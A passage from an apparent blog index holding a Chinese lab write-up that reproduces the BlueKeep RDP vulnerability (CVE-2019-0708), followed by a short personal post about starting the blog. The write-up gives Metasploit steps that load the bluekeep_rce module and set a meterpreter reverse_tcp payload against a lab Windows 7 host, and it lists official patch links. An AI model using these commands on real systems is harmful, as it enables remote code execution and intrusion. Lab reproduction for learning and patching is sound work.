<p>7、2019年7月31日<br>商业漏洞利用套件Canvas加入了CVE-2019-0708的漏洞利用模块</p>
<p>8、2019年9月7日<br>已有公开渠道的Metasploit CVE-2019-0708漏洞利用模块发布，构成现实的蠕虫威胁。</p>
<h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><pre><code>靶机：cn_windows_7_ultimate_with_sp1_x64  10.10.10.129

主机：Kali Linux 10.10.10.128
     配置CVE 2019-0708相关EXP</code></pre><h2 id="0x02-复现过程"><a href="#0x02-复现过程" class="headerlink" title="0x02 复现过程"></a>0x02 复现过程</h2><p>1、靶机关闭防火墙，开启3389端口，开启远程服务</p>
<p>2、kali中对EXP进行如下替换（EXP Github：<a href="https://github.com/rapid7/metasploit-framework/pull/12283/files）">https://github.com/rapid7/metasploit-framework/pull/12283/files）</a></p>
<pre><code>rdp.rb -&gt; /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb

rdp_scanner.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb

cve_2019_0708_bluekeep.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb

cve_2019_0708_bluekeep_rce.rb -&gt; /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce

替换完成后 msf 下执行reload_all</code></pre><p>3、Kali中进入msf执行</p>
<pre><code>search cve-2019-0708
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set rhosts 10.10.10.129
set lhosts 10.10.10.128
set target 3
set payload windows/x64/meterpreter/reverse_tcp
exploit</code></pre><p>4、执行成功</p>
<img src="/2019/10/01/CVE-2019-0708/CVE-2019-0807.PNG" title="avatar">

<p> ps: 第一次复现时成功get shell。第二次复现，只能让靶机蓝屏，暂未查明原因，待补充。</p>
<p>参考教程：</p>
<p><a href="https://www.cnblogs.com/nul1/p/11482119.html" target="_blank" rel="noopener">https://www.cnblogs.com/nul1/p/11482119.html</a></p>
<p><a href="https://blog.csdn.net/qq_29647709/article/details/100610285" target="_blank" rel="noopener">https://blog.csdn.net/qq_29647709/article/details/100610285</a></p>
<p><a href="https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage#reference" target="_blank" rel="noopener">https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961?from=groupmessage#reference</a>        </p>
<h2 id="0x03-最后附上补丁地址"><a href="#0x03-最后附上补丁地址" class="headerlink" title="0x03 最后附上补丁地址"></a>0x03 最后附上补丁地址</h2><p>官方补丁下载</p>
<p>Windows 7 x86<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu</a><br>Windows 7 x64<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a><br>Windows Embedded Standard 7 for x64<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a><br>Windows Embedded Standard 7 for x86<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x86_6f1319c32d5bc4caf2058ae8ff40789ab10bf41b.msu</a><br>Windows Server 2008 x64<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x64_9236b098f7cea864f7638e7d4b77aa8f81f70fd6.msu</a><br>Windows Server   2008 Itanium<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499180-ia64_805e448d48ab8b1401377ab9845f39e1cae836d4.msu</a><br>Windows Server 2008 x86<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.0-kb4499149-x86_832cf179b302b861c83f2a92acc5e2a152405377.msu</a><br>Windows Server 2008 R2 Itanium<br>    <a href="http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/c/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-ia64_fabc8e54caa0d31a5abe8a0b347ab4a77aa98c36.msu</a><br>Windows Server 2008 R2 x64<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/05/windows6.1-kb4499175-x64_3704acfff45ddf163d8049683d5a3b75e49b58cb.msu</a><br>Windows Server   2003 x86<br>    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x86-custom-chs_4892823f525d9d532ed3ae36fc440338d2b46a72.exe</a><br>Windows Server 2003 x64<br>    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-chs_f2f949a9a764ff93ea13095a0aca1fc507320d3c.exe</a><br>Windows XP SP3<br>    <a href="http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/c/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-custom-chs_718543e86e06b08b568826ac13c05f967392238c.exe</a><br>Windows XP SP2 for x64<br>    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsserver2003-kb4500331-x64-custom-enu_e2fd240c402134839cfa22227b11a5ec80ddafcf.exe</a><br>Windows XP SP3 for XPe<br>    <a href="http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/csa/csa/secu/2019/04/windowsxp-kb4500331-x86-embedded-custom-chs_96da48aaa9d9bcfe6cd820f239db2fe96500bfae.exe</a><br>WES09 and   POSReady 2009<br>    <a href="http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/04/windowsxp-kb4500331-x86-embedded-chs_e3fceca22313ca5cdda811f49a606a6632b51c1c.exe" target="_blank" rel="noopener">http://download.windowsupdate.com/d/msdownload/update/software/secu/2019/04/windowsxp-kb4500331-x86-embedded-chs_e3fceca22313ca5cdda811f49a606a6632b51c1c.exe</a></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>我的第一个blog</title>
    <url>/2019/09/30/FistBlog/</url>
    <content><![CDATA[<img src="/2019/09/30/FistBlog/FirstBlog.jpeg" title="avatar">


<p>有幸终于搭建了自己的技术博客，这样提上日程的事情，竟是迟到了许久。</p>
<p>以往的笔记，或者感想都是记录在本地记事本里的，而自己的随笔，思想是附着在我的日记本上的（手写），现在它们有了新家。</p>
<p>与以往不同，它再不是简单的注册一个账号，亦或者发表一些评论。即便是有参考前辈们的教程，在搭建过程中也难免意外频出。</p>
<a id="more"></a>
<p>博客基于hexo+github搭建，这也是我所了解到最多人的选择，不用自己的服务器，网上有详细到每一个步骤的教程。这样一个方式，对于我一个新手，最合适不过。事实上，照葫芦画瓢是人人能做的，那我有无收获呢？有的。以前没有接触过git，markdown，搭建的时候只能一笔一划打上去，不知缘由，之后markdown写文章时，也只能参照模板修改文字。于是乎，我用了一天了解git，记下并使用了基本git语法，又用了半天了解markdown，总结语法。</p>
<p>在我的blog中，我会将之前学习总结的内容逐渐上传，之后的也不在只保存在本地，也都会上传至我的blog，此外还会表达一些自己的看法，以及上传平时写的小文。在一些技术文章中，可能有不对的地方，或有不足可以改进。若有前辈指出，则当虚心接受。</p>
<p>如有联系可私信我的微博</p>
<p>我的微博：<a href="https://weibo.com/heren1016" target="_blank" rel="noopener">GgBoom993</a></p>
<p>我的知乎：<a href="https://www.zhihu.com/people/he-he-65-88-25/activities" target="_blank" rel="noopener">GgBooM</a></p>
<p>我的Github：<a href="https://github.com/GgBoom-993">GgBoom-993</a></p>
<p>此外，您还可以在导航栏发现我的所有文章以及我的其他社交联系方式，GgBoom敬上。</p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>随笔</tag>
        <tag>博客相关</tag>
      </tags>
  </entry>
</search>
